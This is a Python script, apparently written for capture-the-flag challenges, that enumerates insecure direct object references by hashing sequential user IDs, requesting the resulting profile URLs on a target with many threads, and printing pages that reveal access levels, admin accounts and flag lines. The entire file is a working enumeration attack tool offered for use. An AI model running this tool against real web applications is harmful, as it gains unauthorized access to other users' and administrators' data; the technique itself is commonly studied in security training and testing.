#!/usr/bin/env python3
import sys
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

def request_id(url, keyword_target, keyword_admin):
    try:
        r = requests.get(url, allow_redirects=False, timeout=5)
        body = r.text
        if keyword_target in body:
            admin = " [ADMIN]" if keyword_admin in body.lower() else ""
            print(f"[+] {url} (Status: {r.status_code}, Len: {len(r.content)}){admin}")
            if admin:
                for line in body.split("\n"):
                    if "flag" in line.lower():
                        print(f"    FLAG: {line.strip()}")
    except requests.RequestException:
        pass

def idor_enum(urls, threads=10, keyword_target="Access level", keyword_admin="admin"):
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(request_id, u, keyword_target, keyword_admin) for u in urls]
        for f in as_completed(futs):
            f.result()

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: idor_enumerate.py <base_url> <token_template> <id_start> <id_end> [hash_algo] [threads]")
        print("  token_template: path with {hash} placeholder, e.g. /profile/user/{hash}")
        print("  hash_algo: md5 (default), sha1, sha256, or 'none' for plain numeric ids")
        print("Example: idor_enumerate.py http://target.com /profile/user/{hash} 1 30 md5 10")
        sys.exit(1)

    base = sys.argv[1].rstrip("/")
    tmpl = sys.argv[2]
    id_start = int(sys.argv[3])
    id_end = int(sys.argv[4])
    algo = sys.argv[5].lower() if len(sys.argv) > 5 else "md5"
    threads = int(sys.argv[6]) if len(sys.argv) > 6 else 10

    def url_for(i):
        if algo == "none":
            token = str(i)
        else:
            hash_func = getattr(hashlib, algo, hashlib.md5)
            token = hash_func(str(i).encode()).hexdigest()
        return base + tmpl.replace("{hash}", token)

    urls = [url_for(i) for i in range(id_start, id_end + 1)]
    print(f"[*] Hash: {algo}, Range: {id_start}..{id_end}, Threads: {threads}")
    idor_enum(urls, threads)